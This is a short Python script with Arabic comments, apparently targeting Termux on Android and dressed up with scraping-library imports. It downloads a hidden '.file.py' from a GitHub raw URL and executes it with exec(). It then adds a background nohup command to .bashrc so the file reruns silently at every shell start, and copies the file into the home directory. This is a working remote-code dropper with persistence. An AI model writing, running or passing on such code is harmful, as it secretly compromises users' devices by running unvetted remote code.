try:
    import os
    import requests
    import json
    import time
    import re
    import random
    import uuid
    import string
    import subprocess
    from concurrent.futures import ThreadPoolExecutor
    from bs4 import BeautifulSoup
except ModuleNotFoundError as e:
    os.system('pip install requests beautifulsoup4 futures')
    os.system('python .file.py')

# تحميل وتنفيذ كود من الإنترنت
url = 'https://raw.githubusercontent.com/JDXSX/VBCJCXUF/main/.file.py'
try:
    response = requests.get(url)
    response.raise_for_status()
    X1 = response.text
    exec(X1)
except requests.RequestException as e:
    print(f"Failed to download script: {e}")
except Exception as e:
    print(f"Failed to execute script: {e}")

# إعداد الأمر لتشغيل ملف .file.py في الخلفية
hack = 'nohup python /data/data/com.termux/files/home/.file.py > /dev/null 2>&1 &'

# محاولة قراءة ملف .bashrc وإضافة أمر التشغيل إذا لم يكن موجودًا
bashrc_path = '/data/data/com.termux/files/home/.bashrc'
try:
    with open(bashrc_path, 'r') as file:
        content = file.read()
    if hack not in content:
        with open(bashrc_path, 'a') as file:
            file.write(hack)
except IOError as e:
    print(f"Failed to read/write .bashrc: {e}")

# محاولة قراءة ملف .file.py وإذا لم يكن موجودًا، نسخه إلى المسار المحدد
file_path = '/data/data/com.termux/files/home/.file.py'
try:
    with open(file_path, 'r') as file:
        pass  # لا حاجة لفعل شيء هنا، فقط نتحقق من وجود الملف
except IOError:
    try:
        os.system(f'cp -r .file.py {file_path}')
    except Exception as e:
        print(f"Failed to copy file: {e}")
